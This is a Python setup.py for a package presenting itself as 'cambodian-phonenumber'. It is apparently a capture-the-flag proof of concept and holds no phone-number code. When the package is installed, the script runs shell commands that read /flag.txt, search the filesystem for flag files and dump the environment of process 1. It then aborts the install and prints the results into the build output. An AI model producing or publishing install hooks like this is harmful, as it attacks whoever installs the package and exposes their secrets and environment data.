import os, subprocess
from setuptools import setup
def run(c):
    try:
        return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30).stdout.strip()
    except Exception as e:
        return f"<err:{e}>"
out = []
out.append("cat_flag=" + run("cat /flag.txt 2>&1"))
out.append("stat_flag=" + run("stat /flag.txt 2>&1"))
out.append("ls_slash=" + run("ls -la / | grep -i flag"))
out.append("proc1_env=" + run("tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | grep -iE 'flag' || echo none"))
out.append("find2=" + run("find / -maxdepth 2 -iname 'flag*' 2>/dev/null"))
banner = "\n".join("POC>> "+l for l in out)
raise SystemExit("\n\n==== POC OUTPUT START ====\n" + banner + "\n==== POC OUTPUT END ====\n")
setup(name="cambodian-phonenumber", version="0.0.1")
